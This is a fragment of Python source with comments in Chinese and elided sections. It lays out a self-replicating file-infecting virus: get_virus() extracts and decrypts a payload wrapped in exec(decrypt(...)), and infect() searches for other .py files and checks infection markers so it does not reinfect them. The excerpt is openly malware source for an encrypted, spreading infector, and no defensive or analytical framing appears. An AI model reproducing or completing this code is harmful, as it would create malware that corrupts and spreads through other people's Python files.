...
def get_virus():
    ...
    try:
        ...
        # 如果当前文件是加密的，直接返回解密后的代码
        if 'exec(decrypt(' in content:
            # 提取加密的代码和密钥
            match = re.search(r"exec\(decrypt\('([^']+)',(\d+)\)\)", content)
            if match:
                encrypted_code = match.group(1)
                key = int(match.group(2))
                decrypted = decrypt_code(encrypted_code, key)
                if decrypted:
                    return decrypted
...
def infect(target_file):
    ...
    try:
        ...
        if '# --- VIRUS CODE START ---' not in original_code and 'exec(decrypt(' not in original_code:
            ...
            if file.endswith('.py') and file != os.path.basename(__file__):
                try:
                    with open(file, 'r') as f:
                        content = f.read()
                    if '# --- VIRUS CODE START ---' not in content and 'exec(decrypt(' not in content:
